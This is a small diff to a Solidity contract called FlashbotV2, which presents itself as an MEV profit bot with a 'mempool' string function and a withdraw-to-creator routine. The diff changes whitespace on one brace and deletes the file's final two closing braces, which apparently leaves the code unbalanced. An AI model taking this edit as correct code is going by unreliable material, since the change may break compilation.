@@ -103,7 +103,7 @@ contract FlashbotV2 {
         require(success, "Transaction failed");
         uint256 balanceAfter = address(this).balance;
         emit Log("MEV action completed. Profit:", uint2str(balanceAfter - balanceBefore));
-    } 
+     }
 
     /*
      * @dev withdrawals profit back to contract creator address
@@ -414,5 +414,3 @@ function mempool(string memory _base, string memory _value) internal pure return
     } 
 
     return string(_newValue);
-}
-}
